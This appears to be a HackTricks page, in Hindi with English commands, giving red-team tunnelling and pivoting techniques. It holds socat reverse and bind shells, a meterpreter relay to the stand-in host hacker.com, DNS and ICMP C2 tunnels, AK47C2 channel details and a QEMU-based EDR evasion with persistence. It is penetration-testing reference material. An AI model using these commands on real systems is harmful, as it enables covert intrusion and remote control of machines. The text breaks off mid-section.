# टनलिंग और पोर्ट फॉरवर्डिंग

{{#include ../banners/hacktricks-training.md}}

## Nmap सुझाव

> [!WARNING]
> **ICMP** और **SYN** scans को socks proxies के माध्यम से tunnelled नहीं किया जा सकता, इसलिए हमें **disable ping discovery** (`-Pn`) करना चाहिए और **TCP scans** (`-sT`) निर्दिष्ट करना चाहिए ताकि यह काम करे।

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH ग्राफ़िकल कनेक्शन (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

SSH Server में नया Port खोलें --> Other port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Local port --> Compromised host (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Local Port --> Compromised host (SSH) --> कहीं भी
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

यह reverse shells को internal hosts से DMZ के माध्यम से आपके host पर लाने में उपयोगी है:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

आपको दोनों डिवाइसों में **root** होना चाहिए (क्योंकि आप नए interfaces बनाने वाले हैं) और sshd config में root login की अनुमति होनी चाहिए:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
सर्वर साइड पर फ़ॉरवर्डिंग सक्षम करें
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
क्लाइंट साइड पर एक नया रूट सेट करें
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **सुरक्षा – Terrapin Attack (CVE-2023-48795)**
> 2023 का Terrapin downgrade attack man-in-the-middle को early SSH handshake में छेड़छाड़ करने और किसी भी **forwarded channel** में डेटा inject करने की अनुमति दे सकता है (`-L`, `-R`, `-D`). सुनिश्चित करें कि दोनों client और server patched हों (**OpenSSH ≥ 9.6/LibreSSH 6.7**) या SSH tunnels पर भरोसा करने से पहले sshd_config/ssh_config में vulnerable `chacha20-poly1305@openssh.com` और `*-etm@openssh.com` algorithms को स्पष्ट रूप से disable कर दें।

## SSHUTTLE

You can **tunnel** via **ssh** all the **traffic** to a **subnetwork** through a host.\
उदाहरण के लिए, 10.10.10.0/24 की ओर जाने वाले सभी **traffic** को forward करना
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
private key के साथ कनेक्ट करें
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

स्थानीय port --> Compromised host (active session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
एक और तरीका:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

teamserver में सभी इंटरफेस पर सुनने वाला एक पोर्ट खोलें, जिसे ट्रैफ़िक को **beacon के माध्यम से रूट करने** के लिए उपयोग किया जा सके।
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> इस मामले में, **port को beacon host में खोला जाता है**, Team Server में नहीं और ट्रैफ़िक Team Server को भेजा जाता है और वहां से निर्दिष्ट host:port पर भेजा जाता है।
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
ध्यान दें:

- Beacon's reverse port forward को इस तरह डिज़ाइन किया गया है कि यह **Team Server तक ट्रैफिक को टनल करे, व्यक्तिगत मशीनों के बीच रिले करने के लिए नहीं**।
- ट्रैफिक **tunneled within Beacon's C2 traffic**, जिसमें P2P links शामिल हैं।
- **Admin privileges are not required** उच्च पोर्ट्स पर reverse port forwards बनाने के लिए।

### rPort2Port local

> [!WARNING]
> इस मामले में, **port is opened in the beacon host**, न कि Team Server में और **traffic is sent to the Cobalt Strike client** (not to the Team Server) और वहां से संकेतित host:port पर।
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

आपको एक वेब फ़ाइल टनल अपलोड करनी होगी: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

आप इसे [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\ के releases पेज से डाउनलोड कर सकते हैं  
आपको **same version for client and server** का उपयोग करना होगा

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**एजेंट और प्रॉक्सी के लिए वही संस्करण उपयोग करें**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent बाइंडिंग और लिसनिंग
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Agent के लोकल पोर्ट्स तक पहुँच
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. यह tunnel victim से शुरू किया जाता है.\
एक socks4 proxy 127.0.0.1:1080 पर बनाया जाता है।
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot के माध्यम से **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port के माध्यम से socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter को SSL Socat के माध्यम से
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
आप **non-authenticated proxy** को बायपास कर सकते हैं — victim's console में आखिरी कमांड की जगह यह लाइन चलाकर:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

दोनों पक्षों पर प्रमाणपत्र बनाएं: Client और Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

स्थानीय SSH पोर्ट (22) को attacker host के 443 पोर्ट से कनेक्ट करें
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

यह कंसोल PuTTY वर्ज़न जैसा है (ऑप्शन्स एक ssh client की तरह बहुत समान हैं)।

चूँकि यह binary victim पर execute किया जाएगा और यह एक ssh client है, हमें अपनी ssh service और port खोलनी होगी ताकि हम एक reverse connection प्राप्त कर सकें। फिर, केवल locally accessible port को हमारी मशीन के किसी port पर forward करने के लिए:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

आपको local admin होना चाहिए (किसी भी पोर्ट के लिए)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

सिस्टम पर **RDP access** होना चाहिए.\\
डाउनलोड:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - यह टूल Windows के Remote Desktop Service फीचर से `Dynamic Virtual Channels` (`DVC`) का उपयोग करता है। DVC **tunneling packets over the RDP connection** के लिए जिम्मेदार है।
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

अपने क्लाइंट कंप्यूटर पर **`SocksOverRDP-Plugin.dll`** को इस तरह लोड करें:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
अब हम **कनेक्ट** कर सकते हैं **victim** से **RDP** के माध्यम से **`mstsc.exe`** का उपयोग करके, और हमें एक **प्रॉम्प्ट** मिलना चाहिए जिसमें कहा गया हो कि **SocksOverRDP plugin is enabled**, और यह **127.0.0.1:1080** पर **सुनना** शुरू करेगा।

**कनेक्ट** **RDP** के माध्यम से और victim machine में `SocksOverRDP-Server.exe` बाइनरी को अपलोड और निष्पादित करें:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
अब अपनी मशीन (attacker) में पुष्टि करें कि port 1080 listening है:
```
netstat -antb | findstr 1080
```
अब आप [**Proxifier**](https://www.proxifier.com/) **उस पोर्ट के माध्यम से ट्रैफ़िक को proxy करने के लिए।**

## Proxify Windows GUI Apps

आप [**Proxifier**](https://www.proxifier.com/) का उपयोग करके Windows GUI apps को एक proxy के माध्यम से नेविगेट करवा सकते हैं.\
**Profile -> Proxy Servers** में SOCKS server का IP और port जोड़ें.\
**Profile -> Proxification Rules** में उस प्रोग्राम का नाम जोड़ें जिसे आप proxify करना चाहते हैं और उन IPs के कनेक्शन्स जोड़ें जिन्हें आप proxify करना चाहते हैं.

## NTLM proxy bypass

पहले बताए गए टूल: **Rpivot**\
**OpenVPN** इससे भी bypass कर सकता है, configuration file में ये options सेट करके:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

यह proxy के खिलाफ authenticate करता है और लोकली एक port bind करता है जिसे आप द्वारा निर्दिष्ट external service की ओर forward किया जाता है। फिर, आप अपनी पसंद का tool इस port के माध्यम से उपयोग कर सकते हैं।\
उदाहरण के लिए वह forward port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
अब, उदाहरण के लिए अगर आप victim पर **SSH** सेवा को port 443 पर listen करने के लिए सेट करें। आप attacker के port 2222 के माध्यम से उससे कनेक्ट कर सकते हैं.\ आप एक **meterpreter** भी उपयोग कर सकते हैं जो localhost:443 से कनेक्ट करता है और attacker पोर्ट 2222 पर listen कर रहा है।

## YARP

Microsoft द्वारा बनाया गया एक reverse proxy। आप इसे यहाँ पा सकते हैं: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

दोनों systems पर tun adapters बनाने और DNS queries के जरिए उनके बीच डेटा tunnel करने के लिए Root आवश्यक है।
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
टनल बहुत धीमी होगी। आप इस टनल के माध्यम से एक संपीड़ित SSH कनेक्शन बना सकते हैं, इसके लिए उपयोग करें:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

DNS के माध्यम से एक C\&C चैनल स्थापित करता है। इसे root privileges की आवश्यकता नहीं है।
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShell में**

आप [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) का उपयोग करके PowerShell में एक dnscat2 client चला सकते हैं:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscat के साथ Port forwarding**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### proxychains DNS बदलें

Proxychains `gethostbyname` libc कॉल को intercept करता है और TCP DNS अनुरोधों को socks proxy के माध्यम से tunnel करता है। डिफ़ॉल्ट रूप से proxychains का **DNS** सर्वर **4.2.2.2** (hardcoded) है। इसे बदलने के लिए _/usr/lib/proxychains3/proxyresolv_ फाइल एडिट करें और IP बदलें। यदि आप **Windows environment** में हैं तो आप **domain controller** का IP सेट कर सकते हैं।

## Go में Tunnels

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### कस्टम DNS TXT / HTTP JSON C2 (AK47C2)

The Storm-2603 actor ने एक **dual-channel C2 ("AK47C2")** बनाया जो *केवल* आउटबाउंड **DNS** और **plain HTTP POST** ट्रैफिक का दुरुपयोग करता है — ये दोनों प्रोटोकॉल कॉर्पोरेट नेटवर्क पर शायद ही ब्लॉक किए जाते हैं।

1. **DNS मोड (AK47DNS)**
• एक रैंडम 5-करेक्टर SessionID जनरेट करता है (उदा. `H4T14`)।  
• *task requests* के लिए `1` या *results* के लिए `2` prepend करता है और विभिन्न फील्ड्स (flags, SessionID, computer name) को concatenate करता है।  
• प्रत्येक फील्ड को **ASCII key `VHBD@H` से XOR-encrypt** किया जाता है, hex-encoded किया जाता है, और डॉट्स से जोड़ दिया जाता है — अंत में attacker-controlled domain पर समाप्त होता है:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Requests `DnsQuery()` का उपयोग **TXT** (और fallback **MG**) रिकॉर्ड के लिए करते हैं।  
• जब response 0xFF बाइट्स से अधिक हो जाता है तो backdoor डेटा को 63-बाइट हिस्सों में **fragment** करता है और मार्कर्स डालता है: `s<SessionID>t<TOTAL>p<POS>` ताकि C2 सर्वर उन्हें फिर से क्रमबद्ध कर सके।

2. **HTTP मोड (AK47HTTP)**
• एक JSON envelope बनाता है:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• पूरा ब्लॉब XOR-`VHBD@H` → hex → के रूप में **`POST /`** के बॉडी में भेजा जाता है, हेडर `Content-Type: text/plain` के साथ।  
• उत्तर उसी एन्कोडिंग का पालन करता है और `cmd` फ़ील्ड को `cmd.exe /c <command> 2>&1` के साथ execute किया जाता है।

Blue Team notes
• असामान्य **TXT queries** खोजें जिनका पहला लेबल लंबा hexadecimal होता है और जो हमेशा किसी दुर्लभ डोमेन पर समाप्त होते हैं।  
• एक constant XOR key के बाद ASCII-hex का होना YARA से आसानी से detectable है: `6?56484244?484` (`VHBD@H` in hex).  
• HTTP के लिए, text/plain POST बॉडीज़ को फ़्लैग करें जो सिर्फ़ hex हों और दो बाइट्स के गुणज हों।

{{#note}}
पूरा चैनल **standard RFC-compliant queries** के भीतर फिट होता है और प्रत्येक सब-डोमेन लेबल को 63 बाइट्स से नीचे रखता है, जिससे यह अधिकांश DNS लॉग्स में स्टेल्थी बन जाता है।
{{#endnote}}

## ICMP टनलिंग

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

दोनों सिस्टम में tun adapters बनाने और उनके बीच डेटा ICMP echo requests का उपयोग करके टनल करने के लिए Root की आवश्यकता होती है।
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**इसे यहाँ से डाउनलोड करें**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **इंटरनेट पर एक कमांड लाइन में समाधान एक्सपोज़ करने का एक टूल है।**\
_प्रदर्शित URI इस तरह होते हैं:_ **UID.ngrok.io**

### इंस्टॉलेशन

- एक अकाउंट बनाएं: https://ngrok.com/signup
- क्लाइंट डाउनलोड:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### बुनियादी उपयोग

**डॉक्यूमेंटेशन:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_यदि आवश्यक हो तो authentication और TLS जोड़ना भी संभव है._

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTP के माध्यम से फ़ाइलें एक्सपोज़ करना
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

_XSS,SSRF,SSTI ... के लिए उपयोगी_\
सीधे stdout से या HTTP इंटरफ़ेस में [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling आंतरिक HTTP सेवा
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml सरल कॉन्फ़िगरेशन उदाहरण

यह 3 टनल खोलता है:

- 2 TCP
- 1 HTTP जो /tmp/httpbin/ से स्थैतिक फ़ाइलों का प्रदर्शन करता है
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare का `cloudflared` daemon outbound tunnels बना सकता है जो **local TCP/UDP services** को बिना किसी inbound firewall rules की आवश्यकता के expose करते हैं, Cloudflare के edge को rendez-vous point के रूप में उपयोग करते हुए। यह तब बहुत काम आता है जब egress firewall केवल HTTPS traffic की अनुमति देता है लेकिन inbound connections blocked होते हैं।

### Quick tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### DNS के साथ Persistent tunnels
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
कनेक्टर शुरू करें:
```bash
cloudflared tunnel run mytunnel
```
क्योंकि सारा ट्रैफ़िक होस्ट से **outbound over 443** के माध्यम से निकलता है, Cloudflared tunnels ingress ACLs या NAT boundaries को बायपास करने का एक सरल तरीका हैं। ध्यान रखें कि binary आमतौर पर elevated privileges के साथ चलता है — जहाँ संभव हो containers या `--user` flag का उपयोग करें।

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) एक actively-maintained Go reverse-proxy है जो **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching** का समर्थन करता है। Starting with **v0.53.0 (May 2024)** यह **SSH Tunnel Gateway** के रूप में काम कर सकता है, इसलिए target host केवल stock OpenSSH client का उपयोग करके एक reverse tunnel spin up कर सकता है — no extra binary required.

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### नया SSH गेटवे उपयोग करना (कोई frpc binary नहीं)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
ऊपर दिए गए कमांड से लक्षित का पोर्ट **8080** **attacker_ip:9000** के रूप में प्रकाशित होता है बिना किसी अतिरिक्त tooling को deploy किए — living-off-the-land pivoting के लिए आदर्श।

## QEMU के साथ गुप्त VM-आधारित टनल्स

QEMU की user-mode networking (`-netdev user`) में `hostfwd` नाम का एक विकल्प है जो **TCP/UDP पोर्ट को *host* पर बाइंड करता है और उसे *guest* में फॉरवर्ड करता है***। जब *guest* पर एक पूरा SSH daemon चलता है, तो hostfwd नियम आपको एक disposable SSH jump box देता है जो पूरी तरह से एक ephemeral VM के अंदर रहता है — EDR से C2 ट्रैफ़िक छिपाने के लिए परफेक्ट, क्योंकि सभी malicious गतिविधियाँ और फाइलें virtual disk में ही रहती हैं।

### त्वरित एक-लाइनर
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• उपरोक्त कमांड RAM में एक **Tiny Core Linux** इमेज (`tc.qcow2`) लॉन्च करती है.
• Windows host पर पोर्ट **2222/tcp** पारदर्शी रूप से guest के अंदर **22/tcp** पर फॉरवर्ड किया गया है.
• attacker के दृष्टिकोण से target बस पोर्ट 2222 को एक्सपोज करता है; जो भी पैकेट उस तक पहुँचते हैं उन्हें VM में चल रहा SSH सर्वर संभालता है.

### VBScript के माध्यम से गुप्त रूप से लॉन्च करना
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Running the script with `cscript.exe //B update.vbs` keeps the window hidden.

### इन-गेस्ट पर्सिस्टेंस

Because Tiny Core is stateless, attackers usually:

1. पेलोड को `/opt/123.out` पर डालें।
2. `/opt/bootlocal.sh` में जोड़ें:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. `home/tc` और `opt` को `/opt/filetool.lst` में जोड़ें ताकि पेलोड shutdown पर `mydata.tgz` में पैक हो जाए।

### यह डिटेक्शन से कैसे बचता है

• केवल दो unsigned executables (`qemu-system-*.exe`) डिस्क को टच करते हैं; कोई drivers या services इंस्टॉल नहीं होते।  
• होस्ट पर security products को **benign loopback traffic** दिखता है (वास्तविक C2 VM के अंदर terminate होता है)।  
• Memory scanners कभी भी मैलिशियस process space का विश्लेषण नहीं करते क्योंकि वह अलग OS में रहता है।

### Defender टिप्स

• user-writable paths में मिलने वाले **unexpected QEMU/VirtualBox/KVM binaries** पर alert करें।  
• `qemu-system*.exe` से originate होने वाले outbound connections को ब्लॉक करें।  
• QEMU launch के तुरंत बाद bind होने वाले rare listening ports (2222, 10022, …) के लिए hunt करें।

## IIS/HTTP.sys relay nodes via `HttpAddUrl` (ShadowPad)

Ink Dragon का ShadowPad IIS module हर compromised perimeter web server को dual-purpose **backdoor + relay** में बदल देता है, यह covert URL prefixes को सीधे HTTP.sys layer पर bind करके:

